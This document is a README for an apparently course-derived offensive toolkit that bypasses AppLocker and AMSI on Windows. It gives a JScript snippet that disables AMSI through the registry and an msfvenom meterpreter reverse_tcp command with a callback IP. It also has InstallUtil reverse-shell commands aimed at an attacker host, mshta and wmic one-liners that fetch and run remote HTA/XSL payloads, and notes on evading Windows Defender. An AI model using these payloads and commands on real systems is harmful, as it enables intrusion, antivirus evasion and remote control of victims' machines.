# Applocker Bypass

## ToC

| Application | Output | Notes |
| ----------- | ------ | ----- |
| `altBypass` | EXE | Alternate custom ps-runspace for use in evading Application whitelisting |
| `DLLRunner32` | DLL | 32-bit Managed DLL that injects AES-Encrypted `meterpreter` Shellcode into the loading process. For use in HTA & XLS payloads. |
| `DLLInject64` | DLL | 64-bit Managed DLL that injects AES-Encrypted `meterpreter` Shellcode into a target process. For use in HTA & XLS payloads. |
| `psBypass`  | EXE | For use with InstallUtil. Contains AMSI binary patch. Will start an interactive powershell session in FullLanguageMode. |


## `altBypass`
Alternate custom PS-runspace for use in evading Application whitelisting.  Will start an interactive powershell session in **FullLanguageMode** and functions better over remote shells than `psBypass`.  Combination of [superhac/InteractiveRunspace](https://github.com/superhac/OSEP/blob/main/InteractiveRunspace.cs) and [calebstewart/bypass-clm](https://github.com/calebstewart/bypass-clm) with a dynamic patch for AMSI.  

The AMSI patch works by locating `AmsiUacInitialize` and then locating the actual functions we want to patch (`AmsiScanBuffer` and `AmsiScanString`) by grabbing the 1000 bytes preceding `AmsiUacInitiliaze` and then locating the functions within them by byte array. This *avoids the issue of hardcoding the offsets* of the target functions from `AmsiUacInitialize` when the location of the functions change depending on Windows version. 

Has builtin InstallUtils bypass ability.

I have also added the reverse shell functionality as implemented in [padovah4ck/PSByPassCLM](https://github.com/padovah4ck/PSByPassCLM). You can now get PowerShell FullLanguage Mode reverse shells, but note that the process you run it from will stall until you exit the PS Session. This is because the `installUtil` program won't finish until yours does.

### Usage
> TODO: Need to fix argument parsing, currently suited only for remote revshell through bypass

To run a PS FullLanguageMode Session in your current console:
```bat
# without installutil applocker bypass
altbypass.exe

# with bypass
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U <path>\altbypass.exe
```

To get a reverse shell:
```bat
# without bypass
altbypass.exe

# with bypass
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=<ATTACKER_IP> /rport=<ATTACKER_PORT> /U <path>\altbypass.exe
```


## [DLLRunner32](./DLLRunner32/DLLRunner32_DN2JS.cs)

C# source code project that creates a managed (.NET) DLL which contains AES encrypted shellcode. This is designed to be used in an HTA OR XLS payload that has been crafted with the help of the `DotNetToJScript.exe` binary as taught in the course.

An example of both HTA & XLS delivery payloads is included in the `DLLRunner32/payload_dir/` directory.

When Initialized, the DLL decrypts the shellcode, allocates RWX memory for it in the process trying to load the DLL, and points execution to it. The DN2JS program and its required DLL is included in this project as well. To construct the desired JavaScript, you can run the following in DLLRunner32 folder:
```bat
DotNetToJScript.exe DLLRunner32_DN2JS.dll --lang=Jscript -c DLLRunner32_DN2JS --ver=v4 -o DLLRunner32_DN2JS.js
```

### Notes

- The JavaScript output is designed to be delivered through an Internet Explorer client visiting the HTA page
  - Because of this, the shellcode and DLL should be 32-bit
- You will have to change the shellcode payload that is hardcoded into the DLL if wanting to use it, see [below instructions](#creating-new-payloads)
  - It uses an msfvenom payload that I created by default, but you can use **any shellcode**! Just run it through the steps below
  - In terms of reconfiguring the payload to run for you, the [DLLInject64](#dllinject64) project is 20x easier
- Tested on Windows Defender setup:
  ```
  AMEngineVersion                 : 1.1.18400.5
  AMProductVersion                : 4.18.2009.7
  AMRunningMode                   : Normal
  AMServiceEnabled                : True
  AMServiceVersion                : 4.18.2009.7
  AntispywareEnabled              : True
  AntispywareSignatureAge         : 867
  AntispywareSignatureLastUpdated : 8/22/2021 5:28:57 PM
  AntispywareSignatureVersion     : 1.347.247.0
  AntivirusEnabled                : True
  AntivirusSignatureAge           : 867
  AntivirusSignatureLastUpdated   : 8/22/2021 5:28:56 PM
  AntivirusSignatureVersion       : 1.347.247.0
  ```
  - HTA payload Detection
    - The Windows Defender setup shown above flags the DotNetToJS setup code in the Users's Internet Explorer cache directory, but interestingly enough even if the cached file is deleted, the process that the shell is running in (`mshta.exe`) isn't killed. So, you get to keep the shell!
  - XSL payload Detection
    - Not Tested

### AMSI Bypass

Bypassing AMSI highly reduces the detection rate, but DN2JS doesn't provide one natively. So, you can add the below AMSI bypass to your output JScript payloads much like I've done to the examples I've included in this repo.

> NOTE: You must do the bypass **after** the `setversion()` method runs or your payload will break.
> Credit: [rxwx/bypass.js](https://gist.github.com/rxwx/8955e5abf18dc258fd6b43a3a7f4dbf9) (*although its a pretty well-known bypass*)
```js
// 4MS7_BYP455
var sh = new ActiveXObject('WScript.Shell');
var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable";

try{
	var AmsiEnable = sh.RegRead(key);
	if(AmsiEnable!=0){
	throw new Error(1, '');
	}
}catch(e){
	sh.RegWrite(key, 0, "REG_DWORD"); // neuter AMSI
	sh.Run("cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName,0,1); // blocking call to Run()
	sh.RegWrite(key, 1, "REG_DWORD"); // put it back
	WScript.Quit(1);
}
```

Sometimes the AMSI bypass itself is what gets your payload flagged so feel free to play around with it.

### Creating New Payloads

1. Create the payload. Example:
    ```sh
    cd Shellcode-Encryption; msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.45.241 LPORT=53 -f raw > shellcode.raw
    ```
2. Create the template with `shellcode_encoder.py`. Example:
    ```sh
    python shellcode_encoder.py -cs ./shellcode.raw blahBlah76 aes
    ```
3. Copy the key and encrypted shellcode into `DLLRunner32_DN2JS.cs`.
    - Keep in mind that the output template won't match up to the DLL code but you're smart enough to figure it out
    - Just copy/paste into the `key` and `buf` variables
4. Build the project
   - The project is integrated into the all-encompassing solution at `OSEP-Tools-v2/payloads/OSEP-Tools-v2.sln` 
    - Select this project, `Build` (it should be preset to x86-Release)
    - Default config will output to this project's `payload_dir/`
5. Create the JavaScript (on Windows). Example:
    ```bat
    DotNetToJScript.exe DLLRunner32_DN2JS.dll --lang=Jscript -c DLLRunner32_DN2JS --ver=v4 -o DLLRunner32_DN2JS.js
    ```
6. Add the [AMSI Bypass](#amsi-bypass) shown above if desired

### Usage

First create a new JScript payload as shown above.

If using HTA payload:
1. Copy the JScript payload into `HTA_Runner32.hta`, replacing the default.
2. Download and run with `mshta`:
    ```bat
    c:\Windows\SysWOW64\mshta.exe http://IP/path_to_HTA_Runner32.hta
    ```

If using XSL payload:
1. Copy the JScript payload into `XSL_Runner32.xsl`, replacing the default.
2. Download and run with `wmic`:
    ```bat
    wmic.exe process get brief /format:"http://IP/path_to_XSL_Runner32.xsl"
    ```
> NOTE: The 32-bit XSL Payload hasn't been tested. Not sure if its needed because a 32-bit WMIC doesn't exist.


## [DLLInject64](./DLLInject64/DLLInject64_DN2JS.cs)

A combination of `DLLRunner32` and `clinject` (in `Loaders_Disk`) projects. It injects `msfvenom windows/x64/meterpreter/reverse_tctp` shellcode into the specified 64-bit process.

An example of both HTA & XLS delivery payloads is included in the `DLLInject64/payload_dir/` directory.

This is basically the 64-bit brother of `DLLRunner32` that can't be delivered through IE, but is still very useful for bypassing default AppLocker rules. The `mshta.exe` or `wmic.exe` triggering program is in the System32 folder which is whitelisted by default.

### Notes

- This **IS NOT** designed to be delivered through IE like DLLRunner32, rather you're supposed to load it with `mshta.exe`
  - The shellcode and DLL is 64-bit, if triggered through 32-bit IE, it will fail
- You will have to change the IP,PORT, & TGT_PROC arguments see [below instructions](#usage)
- Tested on Windows Defender setup:
  ```
  AMEngineVersion                 : 1.1.18400.5
  AMProductVersion                : 4.18.2009.7
  AMRunningMode                   : Normal
  AMServiceEnabled                : True
  AMServiceVersion                : 4.18.2009.7
  AntispywareEnabled              : True
  AntispywareSignatureAge         : 867
  AntispywareSignatureLastUpdated : 8/22/2021 5:28:57 PM
  AntispywareSignatureVersion     : 1.347.247.0
  AntivirusEnabled                : True
  AntivirusSignatureAge           : 867
  AntivirusSignatureLastUpdated   : 8/22/2021 5:28:56 PM
  AntivirusSignatureVersion       : 1.347.247.0
  ```
  - HTA payload Detection
    - Same detection & caveats as the DLLRunner32 findings
  - XSL payload Detection
    - **Not detected at all** (with the AMSI Bypass)!

### Usage

Change the hardcoded callback IP, Port, and target injection process arguments. The easiest way is to just edit the following line towards the bottom of [DLLInject64_DN2JS.js](DLLInject64/payload_dir/DLLInject64_DN2JS.js):
```js
o.RunProcess("192.168.45.241", "53", "explorer");
```

If using HTA payload:
1. Copy the JScript payload into `HTA_Inject64.hta`, replacing the default.
2. Download and run with `mshta`:
    ```bat
    mshta http://IP/path_to_HTA_Inject64.hta
    ```

If using XSL payload:
1. Copy the JScript payload into `XSL_Inject64.xsl`, replacing the default.
2. Download and run with `wmic`:
    ```bat
    wmic process get brief /format:"http://IP/path_to_XSL_Inject64.xsl"
    ```


## `psBypass`
For use with InstallUtil. Contains AMSI binary patch, but it uses harcoded offsets from `AmsiUacInitialize` of 96 bytes & 352 bytes to look for `AmsiScanBuffer` and `AmsiScanString`. 

Will start an interactive powershell session in FullLanguageMode.
